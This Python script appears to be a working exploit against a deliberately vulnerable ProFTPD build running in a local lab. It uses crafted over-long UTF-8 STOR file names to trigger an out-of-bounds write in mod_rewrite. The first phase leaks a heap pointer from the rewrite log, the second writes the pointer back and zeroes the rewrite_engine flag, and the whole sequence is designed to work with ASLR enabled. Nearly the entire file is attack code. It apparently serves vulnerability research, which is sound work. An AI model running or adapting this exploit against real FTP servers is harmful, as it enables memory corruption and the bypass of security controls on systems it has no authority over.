#!/usr/bin/env python3
"""ASLR-on rung-4 limb: leak substr's heap pointer, then zero rewrite_engine.

Phase 1: a 1025-code-point STOR logs the eight bytes of `substr` inside the
map-result string; only its low byte changes (kept at its original value).
Phase 2: a 1281-code-point STOR writes those eight bytes back into `substr`
(so the logger stays valid) and sets code point 1280 to U+0100, which lands on
the `rewrite_engine` flag one byte at a time via the second OOB loop. Phase 3:
a short STOR shows whether rewriting is still active. ENGINE_ZERO=0 is the
control. No addresses are computed; the sequence is ASLR-independent.
"""
import io
import os
import re
import socket
import subprocess
import sys
import time
import ftplib

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-leak.log"
PORT = 21904
TAG = os.environ.get("TAG", "engine-aslron")


def leak(ftp):
    for _ in range(20):
        time.sleep(0.1)
        try:
            data = open(LOG, "rb").read()
        except OSError:
            continue
        cands = []
        for ln in data.split(b"\n"):
            m = re.search(rb"maps subst'd pattern: '([^']*)'", ln)
            if m and len(m.group(1)) > 500:
                v = m.group(1)[-6:]
                if 0x40 <= v[-1] <= 0x7F:
                    cands.append(v)
        if cands:
            return cands[-1]
    return None

def main():
    zero = os.environ.get("ENGINE_ZERO", "1") == "1"
    out = W + "/evidence/" + TAG + ".txt"
    open(LOG, "wb").close()
    srv = subprocess.Popen([BIN, "-n", "-c", CFG], cwd=W,
                           stdout=open(W + "/log/" + TAG + "-server.out", "wb"),
                           stderr=subprocess.STDOUT)
    lines = []
    try:
        for _ in range(60):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        ftp = ftplib.FTP(encoding="latin-1")
        ftp.connect("127.0.0.1", PORT, timeout=5)
        ftp.login("labuser", "labpass")
        ftp.set_pasv(True)
        k1 = (chr(0xE8) + "A" * 1024).encode("utf-8").decode("latin-1")
        try:
            ftp.storbinary("STOR " + k1, io.BytesIO(b"z" * 16))
        except Exception as exc:
            lines.append("LEAK_STOR_ERR %s" % type(exc).__name__)
        ptr = leak(ftp)
        lines.append("LEAKED_PTR %s" % (ptr.hex() if ptr else "NONE"))
        if ptr is None:
            return
        ptr8 = ptr + b"\x00\x00"
        n = 1281
        cps = ["A"] * n
        for k in range(8):
            cps[8 * k] = chr(ptr8[k]) if ptr8[k] else "\u0100"
        cps[1280] = "\u0100" if zero else "A"
        k2 = "".join(cps).encode("utf-8").decode("latin-1")
        try:
            ftp.storbinary("STOR " + k2, io.BytesIO(b"z" * 16))
            lines.append("LONG_STOR_OK")
        except Exception as exc:
            lines.append("LONG_STOR_ERR %s %s" % (type(exc).__name__, str(exc)[:80]))
        try:
            ftp.storbinary("STOR " + "B" * 200, io.BytesIO(b"z" * 16))
            lines.append("SHORT_STOR_OK")
        except Exception as exc:
            lines.append("SHORT_STOR_ERR %s" % type(exc).__name__)
        for cmd in ("NOOP", "PWD"):
            try:
                lines.append(cmd + "=" + str(ftp.voidcmd(cmd))[:100])
            except Exception as exc:
                lines.append(cmd + "_FAIL " + type(exc).__name__)
        ftp.close()
        time.sleep(0.15)
        data = open(LOG, "rb").read()
        lines.append("EXECUTING_COUNT %d" % data.count(b"executing RewriteRule"))
        lines.append("MAP_SUBST_COUNT %d" % data.count(b"maps subst'd pattern:"))
        lines.append("SIGNALS %d" % open(W + "/log/" + TAG + "-server.out", "rb").read().count(b"signal 11"))
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        with open(W + "/evidence/rewrite-" + TAG + ".log", "wb") as f:
            f.write(data)
        with open(out, "w") as f:
            f.write("\n".join(lines) + "\n")
        print("\n".join(lines))


if __name__ == "__main__":
    main()
